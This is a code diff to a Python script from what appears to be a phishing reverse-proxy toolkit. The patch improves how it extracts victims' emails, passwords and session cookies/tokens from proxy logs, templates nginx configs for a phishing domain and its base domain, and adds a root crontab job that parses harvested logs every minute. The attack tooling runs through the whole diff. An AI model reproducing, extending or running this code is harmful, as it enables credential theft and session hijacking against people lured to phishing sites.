@@ -110,7 +110,7 @@ def get_set_cookies(data):
         if ie > -1 and sn > -1:
             name = ck[:ie]
             val = ck[ie+1:sn]
-            ret[name] = val
+            ret[name] = unesc_data(val)
     return ret
 
 def get_token_names(tokens_json):
@@ -192,12 +192,15 @@ def load_creds_cfg(path):
     cfg = ConfigParser.ConfigParser()
     cfg.read(path)
 
-    if cfg.has_section('creds') and cfg.has_option('creds', 'email_arg') and cfg.has_option('creds', 'passwd_arg') and cfg.has_option('creds', 'tokens'):
+    if cfg.has_section('creds') and ((cfg.has_option('creds', 'email_arg') and cfg.has_option('creds', 'passwd_arg')) or (cfg.has_option('creds', 'email_arg_re') and cfg.has_option('creds', 'passwd_arg_re')) or (cfg.has_option('creds', 'email_json_arg') and cfg.has_option('creds', 'passwd_json_arg')))  and cfg.has_option('creds', 'tokens'):
         return cfg
     return None
 
 def fix_line(line):
     return line.replace('\\x','%')
+
+def unesc_data(data):
+    return data.replace('%22', '"')
 
 def parse_line(cfg, cur_email, line):
     """parse log line"""
@@ -249,7 +252,7 @@ def parse_line(cfg, cur_email, line):
             token_domains = get_token_domains(cfg.get('creds', 'tokens'))
             set_cookies = get_set_cookies(req['set-cookies'])
             try:
-                post_json = json.loads(req['body'])
+                post_json = json.loads(unesc_data(req['body']))
             except:
                 post_json = None
             
@@ -307,6 +310,7 @@ def config_site(cfg, cfg_path, domain, do_enable, crt_path, key_path):
 
     if do_enable:
         phish_domain = domain
+        base_phish_domain = domain.split('.')[-2] + '.' + domain.split('.')[-1]
         phish_hostnames = []
         phish_hostnames_esc = []
         if cfg.get('site', 'phish_subdomains') != '':
@@ -344,10 +348,13 @@ def config_site(cfg, cfg_path, domain, do_enable, crt_path, key_path):
             if key_path == '':
                 key_path_file = SSL_CERT_PATH + phish_domain + '/privkey.pem'
 
+            conf = conf.replace('{{LOG_DIR}}', VAR_LOGS)
+
             conf = conf.replace('{{CERT_PUBLIC_PATH}}', crt_path_file)
             conf = conf.replace('{{CERT_PRIVATE_PATH}}', key_path_file)
 
             conf = conf.replace('{{PHISH_DOMAIN}}', phish_domain)
+            conf = conf.replace('{{BASE_PHISH_DOMAIN}}', base_phish_domain)
             conf = conf.replace('{{REDIR_ARG}}', cfg.get('site', 'redir_arg'))
             conf = conf.replace('{{SUCCESS_ARG}}', cfg.get('site', 'success_arg'))
             conf = conf.replace('{{LOG_NAME}}', cfg.get('site', 'log_name'))
@@ -371,8 +378,10 @@ def config_site(cfg, cfg_path, domain, do_enable, crt_path, key_path):
             save_cfg()
     else:
         for site_conf in site_confs:
-            os.remove(os.path.join(SITES_ENABLED_PATH, site_conf))
-            os.remove(os.path.join(SITES_AVAILABLE_PATH, site_conf))
+            if os.path.exists(os.path.join(SITES_ENABLED_PATH, site_conf)):
+                os.remove(os.path.join(SITES_ENABLED_PATH, site_conf))
+            if os.path.exists(os.path.join(SITES_AVAILABLE_PATH, site_conf)):
+                os.remove(os.path.join(SITES_AVAILABLE_PATH, site_conf))
 
 def list_sites():
     """gets apps config paths"""
@@ -546,11 +555,12 @@ def setup_main(args):
             do_enable = False
         elif args.enable != '':
             site_name = args.enable
+            domain = ''
             if args.domain == '':
                 if site_name in SITE_DOMAINS:
                     domain = SITE_DOMAINS[site_name]
             else:
-                domain = args.domain
+                domain = args.domain.lower()
 
             if domain == '':
                 print '[-] Domain argument needed.'
@@ -595,7 +605,7 @@ def setup_main(args):
                 
                 if not args.auto_yes: auto_parse = raw_input('[?] Do you want to automatically parse all logs every minute? [y/N] ')
                 if args.auto_yes or auto_parse.upper() == 'Y':
-                    print '[+] Logs will be parsing every minute via /etc/crontab.'
+                    print '[+] Logs will be parsed every minute via /etc/crontab.'
                     add_to_file_if_not_exists('/etc/crontab', os.path.join(CUR_DIR, __file__), '*/1 *   * * *   root    python ' + os.path.join(CUR_DIR, __file__) + ' parse -s all')
 
                 if crt_path == '' and key_path == '':
